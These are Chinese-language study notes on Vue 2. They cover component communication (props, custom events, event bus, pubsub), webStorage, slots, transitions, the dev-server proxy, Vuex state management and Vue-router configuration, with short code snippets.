1. 功能：讓組件接受外部傳進來的數據

2. 傳遞數據：
    ```vue
    <Demo :name="xxx"/>
    ```


3. 接收數據：
    1. 只接收
    ```js
    props['name']
    ```

    2. 限制類型
    ```js
    props:{
        name:String
    }
    ```

    3. 限制類型、限制必要性、指定默認值
    ```js
    props:{
        name:{
            type: String     // 類型
            required: true   // 必要性
            default: 'yyy'   // 默認值
        }
    }
    ```


4. 備註：
    - `props`是<font color="#f54747">只讀</font>的，Vue底層會監測對`props`的修改，如果進行了修改，會發出警告
    - 若必須修改傳入數據，那麼可以複製`props`的內容到`data`中，去修改`data`中的數據
    - `props`傳過來的若是對象類型的值，修改對象中的屬性時Vue不會報錯，但不推薦這麼做



### props實現組件間通信
1. 父組件 -> 子組件
    ```vue
    <!-- 父組件 -->
    <template>
        <School name="xxx" :age="19"/>
    </template>
    
    <!-- 子組件 -->
    <script>
        props:['name', 'age']
    </script>
    ```


2. 子組件 -> 父組件
    - 思路：由於`props`只能父組件給子組件，因此父組件可以給子組件一個函數，在傳遞時子組件調用該函數
    ```vue
    <!-- 父組件 -->
    <template>
        <div>
            <h1>Hello World, {{name}}</h1>
            <!-- 父給子一個函數 -->
            <Demo :changeNameFunction="changeNameFunction"/>
        </div>
    </template>
    <script>
        data(){
            return {
                name:''
            }
        },
        methods: {
            // 修改數據
            changeNameFunction(name){
                this.name = name
            }
        }
    </script>
    
    <!-- 子組件 -->
    <template>
        <div>
            <input type="text" v-model="name">
            <button @click="changeName">Click</button>
        </div>
    </template>
    <script>
        props:['changeNameFunction'],
        data() {
            return {
                name:'',
            }
        },
        methods: {
            changeName(){
                // 要修改數據時，調用父組件的方法，並通過參數傳遞數據
                this.changeNameFunction(this.name)
            }
        },
    </script>
    ```



## 瀏覽器本地存儲webStorage
1. 儲存內容大小一般支持5MB左右


2. 瀏覽器通過`Window.sessionStorage` 和 `Window.localStorage` 屬性來實現本地儲存機制


3. 相關API：
    1. `xxxxxStorage.setItem('key', 'value')`
        - 該方法接收一個鍵和值為參數，會把鍵值添加到儲存中，如果鍵名存在，則更新其對應的值
        - 儲存的value統一變更為字符串：
            - 因此可以使用`JSON.stringify()`將對象以字符串形式保存
            - 再以`JSON.parse()`的方式將字符串轉變為對象

    2. `xxxxxStorage.getItem('key')`
        - 該方法接收一個鍵名作為參數，返回鍵名對應的值

    3. `xxxxxStorage.removeItem('key')`
        - 該方法接收一個鍵名作為參數，並把該鍵名從儲存中刪除

    4. `xxxxxStorage.clear()`
        - 該方法會清空存儲中所有數據


4. 備註：
    1. `SessionStorage`存儲的內容會隨著瀏覽器窗口關閉而消失
    2. `LocalStorage`存儲的內容需要手動清除才會消失
    3. `xxxxStorage.getItem('key')`如果key對應的value獲取不到，則返回null
    4. `JSON.parse(null)`的結果依然是null



## 組件自定義事件
1. 一種組件鍵的通信方式，適用於：子組件 -> 父組件

2. 使用場景：子組件想給父組件傳遞數據，那麼就要在父組件中給子組件綁定自定義事件（事件的回調函數在A中）


### 綁定自定義事件
1. 用`@`或`v-on`綁定自定義事件
    - 具體代碼：
        ```vue
        <template>
            <!-- 第一種方式：使用 @ 或 v-on 綁定自定義事件 -->
            <Student @xxx="demo"/>
            <Student v-on:xxx="demo"/>
        </template>
        <script>
            // 配置事件回調函數
            methods:{
                demo(para){ ... }
            },
        </script>
        ```

    - 一次性綁定自定義事件：
        ```vue
        <template>
            <Student @xxx.once="demo"/>
            <Student v-on:xxx.once="demo"/>
        </template>
        ```


2. 使用`ref`綁定自定義事件
    - 注意：通過`this.$refs.test.$on()`綁定事件時，回調函數`demo()`<font color="#f54747">要麼配置在methods中，要麼使用箭頭函數</font>，否則this會指向子組件

    - 具體代碼：
        ```vue
        <template>
            <!-- 第二種方式：使用 ref 綁定自定義事件 -->
            <Student ref="student"/>
        </template>
        <script>
            // 配置事件回調函數
            methods:{
                demo(para){ ... }
            },
            mounted(){
                this.$refs.student.$on('xxx', this.demo)
                this.$refs.student.$on('xxx', () => { ... })
            }
        </script>
        ```

    - 優勢：更加靈活，能追加其他需求
        ```js
        mounted(){
            // 實現3秒後再綁定自定義事件
            setTimeout(() => {
                this.$refs.student.$on('xxx', this.demo)
            }, 3000)
        }
        ```

    - 一次性綁定自定義事件：
        ```vue
        <script>
            // 更換 $on API為 $once
            this.$refs.test.$once('event', this.demo)
        </script> 
        ```



### 觸發自定義事件
- 使用`$emit()`觸發自定義事件
    ```vue
    <!-- 子組件 -->
    <template>
        <button @click="sendStudentName">Click</button>
    </template>
    <script>
        methods:{
            sendStudentName(){
                // 觸發子組件身上的xxx事件
                this.$emit('xxx', param1, param2, ...)
            }
        }
    </script>
    ```

- 自定義事件回調函數接收參數
    ```js
    methods:{
        // 接收一個參數
        demo(param){ ... }
        // 接收多個參數，封裝到 params[]
        demo(...params){ ... }
    }
    ```



### 解綁自定義事件
- 使用`$off`解綁自定義事件
    ```vue
    <!-- 子組件 -->
    <template>
        <button @click="unbind">Click</button>
    </template>
    <script>
        methods:{
            unbind(){
                this.$off('event')          // 解綁單一事件
                this.$off(['e1','e2'])      // 解綁多項事件
                this.$off()                 // 解綁全部事件
            }
        }
    </script>
    ```



### 綁定原生事件
- 組件上也可以綁定原生DOM事件，需要使用`native`修飾符
    ```vue
    <template>
        <Student @click.native="funct" />
    </template>
    ```



## 全局事件總線
1. 全局事件總線(Global Event Bus)是一種組件間通信的方式，適用於任意組件間通信


2. 在`main.js`安裝全局事件總線
    ```js
    new Vue({
        ...
        beforeCreate(){
            Vue.prototype.$bus = this   // 安裝全局事件總線
        }
    })
    ```


3. 使用事件總線  
    1. 接收數據：  
        - A組件想接收數據，則在A組件中給`$bus`綁定自定義事件，事件在回調留在A組件身上
        ```js
        methods(){
            demo(data){...}
        },
        mounted(){
            // 配置在methods中
            this.$bus.$on('xxx', this.demo)
            // 使用箭頭函數
            this.$bus.$on('xxx', (data) => {
                ...
            })
        },
        beforeDestory(){
            this.$bus.$off('xxx')
        }
        ```

    2. 提供數據：
        ```js
        this.$bus.$emit('xxx', data)
        ```



## 消息訂閱與發布
1. 消息訂閱與發布 (pubsub) 是一種組件間通信的方式，適用於任意組件間通信


2. 安裝pubsub
    ```bash
    npm i pubsub-js
    ```


3. 在`main.js`引入
    ```js
    import pubsub from 'pubsub-js'
    ```


4. 使用pubsub
    1. 接收數據：  
        - A組件想接收數據，則在A組件中訂閱消息，訂閱的回調留在A組件自身中
        ```js
        methods(){
            demo(data){...}
        },
        ...
        mounted(){
            this.pid = pubsub.subscribe('xxx', this.demo)
            this.pid = pubsub.subscribe('xxx', (parameters) => {
                ...
            })
        },
        beforeDestory(){
            pubsub.unsubscribe(this.pid)
        }
        ```

    2. 提供數據：
        ```js
        pubsub.publish('xxx', data)
        ```



## nextTick
1. 解析順序的問題：
    - 使用`v-show`時，由於元素在調用函數時並沒有來到頁面上，因此對元素的操作無效
    - 案例：
        ```vue
        <template>
            <div>
                <!-- 點擊按鈕時出現input框並獲取焦點 -->
                <input type="text" v-show="item.isEdit" ref="inputTitle">
                <button @click="handleEdit(item)">Edit</button>
            </div>
        </template>
        <script>
            methods:{
                handleEdit(item){
                    if(item.hasOwnProperty('isEdit')){
                        item.isEdit = true
                    }else{
                        this.$set(item, 'isEdit', true)
                    }
                    // 由於調用函數時，input框還沒有來到頁面上，因此無法獲取焦點
                    this.$refs.inputTitle.focus()
                }
            }
        </script>
        ```


2. 使用`nextTick()`方法
    - 作用：在下一次DOM更新結束後，執行其指定代碼
    - 當改變數據後，要基於更新後的新DOM進行某些操作時，要在`nextTick`所制定的回調函數中執行


3. 語法：
    ```js
    this.$nextTick(回調函數)
    ```


4. 具體代碼：
    ```js
    // 在DOM更新完畢後執行函數
    this.$nextTick(function(){
        // DOM更新完畢，input框已經在頁面上，就可以獲取焦點了
        this.$refs.inputTitle.focus()
    })
    ```



## 過渡與動畫
1. 作用：在插入、更新或移除DOM元素時，在合適的時候給元素添加樣式類名


2. 語法：  
    1. 樣式：  
        - 元素進入的樣式：
            1. `v-enter` 進入的起點
            2. `v-enter-active` 進入過程中（進入的時候被激活）
            3. `v-enter-to` 進入的終點

        - 元素離開的樣式：
            1. `v-leave` 離開的起點
            2. `v-leave-active` 離開過程中
            3. `v-leave-to` 離開的終點

    2. 使用`<transition>`包裹要過度的元素，並配置name屬性：
        ```html
        <transition name="xxx">
            <h1 v-show="isShow">Hello<h1>
        </transition>
        ```
        樣式：
        ```css
        xxx-enter{...}
        ...
        ```

    3. 備註：若有多個元素需要過渡，則需要使用`<transition-group>`，切每一個元素都要指定的`key`值


3. 其他：
    - 初始引入動畫，在`<transition>`中加入`appear`



## 動畫庫
1. 安裝：
    ```js
    npm install animate.css
    ```


2. 引入：
    ```js
    import 'animate.css'
    ```


3. 使用：
    ```html
    <transition 
        name="animate__animated animate__bounce"
        <!-- 複製粘貼已配置的動畫名xxx -->
        enter-active-class="xxx"
        leave-active-class="xxx"
    >
        <a href="https://animate.style/">animate.css官網</a>
    </transition>
    ```



# Vue-ajax

## Vue腳手架配置代理
1. 方法一：在`vue.config.js`中添加如下配置
    ```js
    devServer: {
        proxy: 'http://localhost:5001'
    },
    ```
    - 優點：配置簡單，請求資源時直接發給前端(8080)即可
    - 缺點：不能配置多個代理，不能靈活的控制請求是否走代理
    - 工作方式：若按照上述配置代理，當請求了前端不存在的資源時，那麼該請求會轉發給服務器（優先匹配前端資源）


2. 方法二：編寫`vue.config.js`配置具體代理規則
    ```js
    devServer: {
        proxy: {
            '/api1': {      // 匹配所有以 '/api1' 開頭的請求路徑
                target: 'http://localhost:5001',    // 代理目標的基礎路徑
                pathRewrite:{'^/api1':''},  
                ws: true,
                changeOrigin: true
            },
            '/api2': {      // 匹配所有以 '/api2' 開頭的請求路徑
                target: 'http://localhost:5002',    // 代理目標的基礎路徑
                pathRewrite:{'^/api2':''},
                ws: true,
                changeOrigin: true
            },
        }
    }
    /*
        changeOrigin設置為true時，服務器收到的請求頭中的host為：localhost:5001
        changeOrigin設置為false時，服務器收到的請求頭中的host為：localhost:8080
        changeOrigin默認值為true
    */
    ```
    - 優點：可以配置多個代理，而且可以靈活的控制請求是否要走代理
    - 缺點：配置略微繁瑣，請求資源時必須加前綴



## 插槽slot
1. 作用：
    1. 默認插槽、具名插槽：讓父組件可以向子組件指定位置插入html結構
    2. 作用域插槽：可以是一種通信方式，適用於父組件 -> 子組件


2. 默認插槽：
    - 具體代碼：
        ```vue
        <!-- 父組件 -->
        <template>
            <Category>
                <div> HTML結構 </div>
            </Category>
        </template>
        
        <!-- 子組件 -->
        <template>
            <div>
                <!-- 定義插槽 -->
                <slot> 插槽默認內容 </slot>
            </div>
        </template>
        ```



3. 具名插槽：
    - 具體代碼：
        ```vue
        <!-- 父組件 -->
        <template>
            <Category>
                <!-- 方式一 -->
                <template slot="slotName1">
                    <div> HTML結構1 </div>
                </template>
                <!-- 方式二 -->
                <template v-slot:slotName2>
                    <div> HTML結構2 </div>
                </template>
            </Category>
        </template>
        
        <!-- 子組件 -->
        <template>
            <div>
                <!-- 定義插槽 -->
                <slot name="slotName1"> 插槽默認內容 </slot>
                <slot name="slotName2"> 插槽默認內容 </slot>
            </div>
        </template>
        ```



4. 作用域插槽
    - 理解：<font color="#f54747">當數據在組件的自身<font color="green">(子組件)</font>，但根據數據生成的結構需要組件的使用者<font color="green">(父組件)</font>來決定</font>
    
    - 具體代碼：
        ```vue
        <!-- 父組件 -->
        <template>
            <Category>
                <template scope="scopeData">
                    <!-- 生成ul列表 -->
                    <ul>
                        <li v-for="(item,index) in scopeData.games" :key="index">{{item}}<li>
                    </ul>
                </template>
            </Category>
            <Category>
                <template scope="scopeData">
                    <!-- 生成h4標題 -->
                    <h4 v-for="(item,index) in scopeData.games" :key="index">{{item}}</h4>
                </template>
            </Category>
        </template>
        
        <!-- 子組件 -->
        <template>
            <div>
                <slot :games="games"></slot>
            </div>
        </template>
        <script>
            export default {
                name:'Category',
                props:['title'],
                // 數據在子組件中
                data(){
                    return {
                        games:['a', 'b', 'c' ,'d']
                    }
                }
            }
        </script>
        ```



# Vuex

## Vuex簡介
1. 概念：
    專門在Vue中實現<font color="#f54747">集中式數據(狀態)管理</font>的一個Vue插件，對Vue應用中多個組件的共享數據(狀態)進行集中式的管理(讀/寫)，也是一種組件間通信的方式，適用於任意組件中的通信


2. 什麼時候使用Vuex
    a. 多個組件依賴於同一數據
    b. 來自不同組件的行為需要變更同一數據



## Vue工作原理
<img src="https://p.ipic.vip/6sd35u.png" alt="vuex"/>

1. `Vue Components`：組件，發送操作
    - 通過調用`dispatch()`方法向Vuex傳遞要執行的操作
        ```js
        // 參數一、要進行的操作
        // 參數二、操作所需的數據
        dispatch('add', 2)
        ```


2. `Actions`：一個對象，用於保存動作、行為
    - 裏面存有操作所對應的 <font color="skyblue">方法</font>`add:function(){...}`
    - 在函數裡調用`commit()`方法向Mutations傳遞數據
        ```js
        // 參數一、要進行的操作
        // 參數二、操作所需的數據
        commit('add', 2)
        ```


3. `Mutations`：一個對象，用於修改、更新數據
    - 裏面存有操作所對應的 <font color="skyblue">初始化的State 和 操作的數據</font>
    - 通過以下方式更改保存在State中的數據，進行數據的更新
        ```js
        state.sum += 2
        ```


4. `State`：一個對象，用於保存數據
    - 當數據更新完後，Vuex會重新解析和渲染頁面上的動態數據



## 搭建Vuex環境
1. 創建`store`：
    - 創建文件：`src/store/index.js`
        ```js
        // 引入Vue核心庫
        import Vue from 'vue'
        // 引入Vuex
        import Vuex from 'vuex'
        // 應用Vuex插件
        Vue.use(Vuex)
        
        // 準備actions，用於響應組件中的動作
        const actions = {}
        
        // 準備mutations，用於操作數據(state)
        const mutations = {}
        
        // 準備state，用於存儲數據
        const state = {}
        
        // 創建並暴露store
        export default new Vuex.Store({
            actions,
            mutations,
            state
        })
        ```


2. 配置`store`：
    - 在`main.js`中創建`vm`時傳入`store`配置項
        ```js
        // 引入store
        import store from './store/index.js'
        
        new Vue({
            // 配置store
            store,
        })
        ```



## Vuex基本使用
1. 初始化數據，配置`actions`、配置`mutations`，操作文件`store.js`
    ```js
    // 引入Vue
    import Vue from 'vue'
    // 引入Vuex
    import Vuex from 'vuex'
    // 使用vuex插件
    Vue.use(Vuex)
    
    const actions = {
        add(context,value){
            context.commit('ADD', value)
        },
    }
    
    const mutations = {
        ADD(state,value){
            state.sum += value
        },
    }
    
    // 初始化數據
    const state = {
        sum:0,
    }
    
    export default new Vuex.Store({
        actions,
        mutations,
        state,
    })
    ```


2. 組件中讀取vuex的數據：
    ```js
    $store.state.sum
    ```


3. 組件中修改vuex中的數據：
    ```js
    $store.dispatch('actionName', data)     // 透過actions修改數據
    $store.commit('mutationsName', data)    // 跳過actions，直接聯繫mutations修改
    ```
    - 備註：若沒有網絡請求或其他邏輯，則可直接使用`commit`修改數據


## getters的使用
1. 概念：當`state`中的數據需要進行加工後再使用，可以使用getters加工


2. 在`store.js`中追加`getters`配置
    ```js
    ...
    
    const getters = {
        tenTimes(state){
            return state.sum * 10
        }
    }
    
    export default new Vuex.Store({
        ...
        getters,
    })
    ```


3. 組件中讀取數據：
    ```js
    $store.getters.tenTimes
    ```



## 四種map方法的使用
1. `mapState`方法：用於映射`state`中的數據為計算屬性
    ```js
    computed:{
        // 借助 mapState 生成計算屬性，從state中讀取數據（對象寫法）
        ...mapState({a:'sum', b:'school', c:'major'}),
    
        // 借助 mapState 生成計算屬性，從state中讀取數據（數組寫法）
        ...mapState(['sum', 'school', 'major']),
    }
    ```


2. `mapGetters`方法：用於映射`getters`中的數據為計算屬性
    ```js
    computed:{
        // 借助 mapGetters 生成計算屬性，從getters中讀取數據（對象寫法）
        ...mapGetters({tenTimes:'tenTimes'})
    
        // 借助 mapGetters 生成計算屬性，從getters中讀取數據（數組寫法）
        ...mapGetters(['tenTimes'])
    }
    ```


3. `mapActions`方法：用於生成與`actions`對話的方法，即包含`$store.dispatch(xxx)`的函數
    ```js
    computed:{
        // 借助 mapActions 生成對應的方法，方法中會調用dispatch去聯繫actions（對象的寫法）
        ...mapActions({incrementOdd:'addOdd', incrementWait:'addWait'}),
    
        // 借助 mapActions 生成對應的方法，方法中會調用dispatch去聯繫actions（對象的寫法）
        ...mapActions(['addOdd', 'addWait']),
    }
    ```


4. `mapMutations`方法：用於生成與`mutations`對話的方法，即包含`$store.commit(xxx)`的函數
    ```js
    computed:{
        // 借助 mapMutations 生成對應的方法，方法中會調用commit去聯繫mutations（對象的寫法）
        ...mapMutations({increment:'ADD', decrement:'MINUS'}),
    
        // 借助 mapMutations 生成對應的方法，方法中會調用commit去聯繫mutations（數組的寫法）
        ...mapMutations(['ADD', 'MINUS']),
    }
    ```


5. 備註：`mapActions` 與 `mapMutations` 使用時，若需要傳遞參數，<font color="#f54747">需要在模板中綁定事件時傳遞參數</font>，否則參數是默認的事件對象



## Vuex模塊化及命名空間
1. 目的：讓代碼更好維護，讓更多數據分類明確


2. 修改`store.js`
    ```js
    const countAbout = {
        namespaced:true     // 開啟命名空間
        state:{...},
        actions:{...},
        mutations:{...},
        getters:{...}
    }
    const personAbout = {
        namespaced:true     // 開啟命名空間
        state:{...},
        actions:{...},
        mutations:{...},
        getters:{...}
    }
    export default new Vuex.Store({
        modules:{
            countAbout,
            personAbout,
        }
    })
    ```


3. 開啟命名空間後，組件中讀取`state`數據：
    ```js
    // 方式一：直接讀取
    this.$store.state.countAbout.xxx
    // 方式二：借助mapState讀取
    ...mapState('countAbout', ['xxx'])
    ```


4. 開啟命名空間後，組件中讀取`getters`數據：
    ```js
    // 方式一：直接讀取
    this.$store.getters['countAbout/xxx']
    // 方式二：借助mapGetters讀取
    ...mapGetters('countAbout', ['xxx'])
    ```


5. 開啟命名空間後，組件中調用`dispatch`：
    ```js
    // 方式一：直接讀取
    this.$store.dispatch('countAbout/xxx', value)
    // 方式二：借助mapActions讀取
    ...mapActions('countAbout', ['xxx'])
    ```


6. 開啟命名空間後，組件中調用`commit`：
    ```js
    // 方式一：直接讀取
    this.$store.commit('countAbout/XXX', value)
    // 方式二：借助mapMutations讀取
    ...mapMutations('countAbout', ['XXX'])
    ```



# Vue-router

## Vue-router理解
1. 理解：
    vue的一個插件庫，專門用來實現SPA應用


2. 對SPA應用的理解：
    1. 單頁Web應用 (single page web application)
    2. 整個應用只有一個完整的頁面
    3. 點擊頁面中的導航鏈接不會刷新頁面，只會做頁面的<font color="#f54747">局部更新</font>
    4. 數據需要用過ajax請求獲取



## route路由的理解
1. 理解：
    1. 一個就是一組映射關係 (key - value)
    2. `key`為路徑，`value`可能是`function`或`component`


2. 路由的分類：
    1. 後端路由：
        - 理解：`value`是`function`，統御處理客戶端提交的請求
        - 工作過程：服務器接收到一個請求時，根據請求路徑找到匹配的函數來處理請求，返回響應函數
    2. 前端路由：
        - 理解：`value`是`component`，用於展示頁面內容
        - 工作過程：當瀏覽器的路徑改變時，對應的組件就會顯示



## Vue-router的基本使用
1. 安裝
    ```bash
    npm i vue-router
    ```


2. 在`main.js`中應用插件：
    ```js
    // 引入
    import VueRouter from 'vue-router'
    // 應用
    Vue.use(VueRouter)
    ```


3. 編寫`router`配置項：
    ```js
    // 引入VueRouter
    import VueRouter from 'vue-router'
    // 引入組件
    import About from '../components/About'
    import Home from '../components/Home'
    
    // 創建並暴露router實例對象，去管理路由規則
    export default new VueRouter({
        routes:[
            {
                path:'/about',
                component:About
            },
            {
                path:'/home',
                component:Home
            }
        ]
    })
    ```


4. 實現切換：借助`<router-link>`標籤實現路由的切換
    - `active-class`可配置高亮樣式
    ```vue
    <router-link active-class="active" to="/about">About</router-link>
    <router-link active-class="active" to="/home">Home</router-link>
    ```


5. 指定展示位置：借助`<router-view>`指定組件的呈現位置
    ```vue
    <router-view></router-view>
    ```


6. 注意：
    1. 路由組件通常存放在`pages`文件夾，一般組件通常存放在`components`文件夾
    2. 通過切換，「隱藏」了的路由組件，默認是被<font color="#f54747">銷毀掉</font>的，需要的時候再去掛載
    3. 每個組件都有自己的`$route`屬性，裏面存放著自己的路由信息
    4. 整個應用只有一個router，可以通過組件的`$router`屬性獲取



## 嵌套路由（多級路由）
1. 配置路由規則時，使用`children`配置項：
    ```js
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home,
            children:[
                {
                    path:'news',        // 此處一定不要寫'/news'
                    component:News
                },
                {
                    path:'message',     // 此處一定不要寫'/message'
                    component:Message
                }
            ]
        }
    ]
    ```

2. 跳轉（要寫完整路徑）：
    ```vue
    <router-link to="/home/news">News</router-link>
    ```



## 路由的query參數
1. 傳遞參數
    ```vue
    <!-- 跳轉路由並攜帶query參數，to的字符串寫法 -->
    <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link>
    
    <!-- 跳轉路由並攜帶query參數，to的對象寫法 -->
    <router-link
        :to="{
            path:'home/message/detail',
            query:{
                id:m.id,
                title:m.title
            }
        }"
    >{{m.title}}</router-link>
    ```


2. 接收參數：
    ```js
    $route.query.id
    $route.query.title
    ```



## 命名路由
1. 作用：可以簡化路由的跳轉（路由地址）


2. 使用方法：
    1. 給路由取名字
        ```js
        {
            path:'/demo',
            component:Demo,
            children:[
                {
                    path:'test',
                    component:Test,
                    children:[
                        {
                            name:'hello',       // 給路由命名
                            path:'welcome',
                            component:Hello,
                        }
                    ]
                }
            ]
        }
        ```

    2. 簡化跳轉
        ```vue
        <!-- 簡化前寫法：完整路徑 -->
        <router-link to="/demo/test/welcome"></router-link>
        
        <!-- 簡化後寫法：直接通過名字跳轉 -->
        <router-link :to="{name:'hello'}"></router-link>
        
        <!-- 簡化後配合傳遞參數 -->
        <router-link
            :to="{
                name:'hello',
                query:{
                    id:xxx,
                    title:yyy
                }
            }"
        ></router-link>
        ```



## 路由的params參數
1. 配置路由，聲明接收的params參數：
    ```js
    {
        path:'/home',
        component:Home,
        children:[
            {
                path:'message',
                component:Message,
                children:[
                    {
                        name:'detailRouter',
                        path:'detail/:id/:title',  // 使用佔位聲明接收params參數
                        component:Detail,
                    }
                ]
            }
        ]
    }
    ```


2. 傳遞參數：
    ```vue
    <!-- 跳轉路由並攜帶params參數，to的字符串寫法 -->
    <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link>
    
    <!-- 跳轉路由並攜帶params參數，to的對象寫法 -->
    <router-link
        :to="{
            name:'detailRouter',
            params:{
                id:m.id,
                title:m.title
            }
        }"
    >{{m.title}}</router-link>
    ```
    - 注意點：路由攜帶params參數時，若使用to的對象寫法，則不能使用`path`配置項，必須使用`name`配置


3. 接收參數
    ```vue
    $route.params.id
    $route.params.title
    ```



## 路由的props配置
1. 作用：讓路由器組件更方便的接收到參數


2. 使用方法：
    ```js
    // 第一種寫法：對象。該對象中的所欲key-value都會以props的形式傳給Detail組件
    props:{a:1,b:'hello'}
    
    // 第二種寫法：值為布爾值。若布爾值為真，則把該路由組件收到的所有params參數，以props的形式傳給Detail組件
    props:true
    
    // 第三種寫法：值為函數。該函數返回的對象中每一組key-value都會通過props傳給Detail組件
    props($route){
        return{
            id:$route.query.id,
            title:$route.query.title
        }
    }
    ```



## replace屬性
1. 作用：控制路由器跳轉時操作瀏覽器歷史紀錄的模式


2. 瀏覽器的歷史紀錄有兩種寫入方式：分別是`push`和`replace`
    - `push`是追加歷史紀錄
    - `replace`是替換當前紀錄
    - 路由跳轉時默認為`push`


3. 開啟`replace`模式：
    ```vue
    <router-link replace ...></router-link>
    ```



## 編程式路由導航
1. 作用：不借助`<router-link>`實現路由跳轉，讓路由跳轉更加靈活


2. 具體代碼：
    ```js
    // 以 push模式 跳轉到指定路由
    this.$router.push({
        name:'routeName',
        params:{
            id:xxx,
            title:xxx
        }
    })
    
    // 以 replace模式 跳轉到指定路由
    this.$router.replace({
        name:'routeName',
        params:{
            id:xxx,
            title:xxx
        }
    })
    
    this.$router.forward()  // 前進
    this.$router.back()     // 後退
    this.$router.go(n)      // 取決於 n 的數值前進或後退
    ```



## 緩存路由組件
1. 作用：讓不展示的路由組件保持掛載，不被銷毀


2. 具體代碼：
    ```vue
    <!-- 使用 include 指定需要保持掛載的組件 -->
    <keep-alive include="componentName">
        <router-view></router-view>
    </keep-alive>
    <!-- 使用 include 指定多個組件 -->
    <keep-alive :include="['component1','component2']">
        <router-view></router-view>
    </keep-alive>
    ```



## 路由的兩個生命週期鉤子
1. 作用：路由組件所獨有的兩個鉤子，用於捕獲路由組件的激活狀態


2. 具體代碼：
    ```js
    // 路由組件被激活時觸發
    activated(){
        ...
    }
    
    // 路由組件失去激活時觸發
    deactivated(){
        ...
    },
    ```



## 路由守衛
1. 作用：對路由進行權限控制


2. 全局路由守衛：用於監測所有路由切換
    ```js
    // 全局前置路由守衛 ———— 初始化的時候被調用、每次路由切換之前被調用
    router.beforeEach((to, from, next) => {
        if(to.meta.isAuth){     // 判斷是否需要鑒定權限
            if(localStorage.getItem('school') === 'CUHK'){
                next()  // 放行
            }else{
                alert('No auth to enter!')
            }
        }else{
            next()  // 放行
        }
    })
    
    // 全局後置路由守衛 ———— 初始化的時候被調用、每次路由切換之後被調用
    router.afterEach((to, from) => {
        document.title = to.meta.title || 'Main Page'
    })
    ```


3. 獨享路由守衛：用於監測指定的路由切換
    ```js
    beforeEnter: (to, from, next) => {
        if(to.meta.isAuth){
            if(localStorage.getItem('school') === 'CUHK'){
                next()
            }else{
                alert('No auth to enter!')
            }
        }else{
            next()
        }
    }
    ```
    - 備註：獨享路由守衛並沒有切換後的函數設置


4. 組件內路由守衛
    ```js
    // 進入路由守衛 ———— 通過路由規則，進入該組件時被調用
    beforeRouteEnter(to, from, next){
        if(to.meta.isAuth){     // 判斷是否需要鑒定權限
            if(localStorage.getItem('school') === 'CUHK'){
                next()
            }else{
                alert('No auth to enter!')
            }
        }else{
            next()
        }
    },
    
    // 離開路由守衛 ———— 通過路由規則，離開該組件時被調用
    beforeRouteLeave(to, from, next){
        next()
    }
    ```



## 路由器的兩種工作模式
1. 對於url而言，hash值就是 ———— #及其後面的內容


2. hash值不會包含在HTTP請求中，即：hash值不會帶給服務器

3. hash模式：
    1. 地址中永遠帶著 # 符號
    2. 若以後講地址通過第三方手機app分享，若app校驗嚴格，則地址會被標記為不合法
    3. 兼容性好

4. history模式：
    1. 地址美觀
    2. 兼容性和hash模式相比略差
    3. 應用部署上線時需要後端人員支持，解決刷新頁面服務器404問題
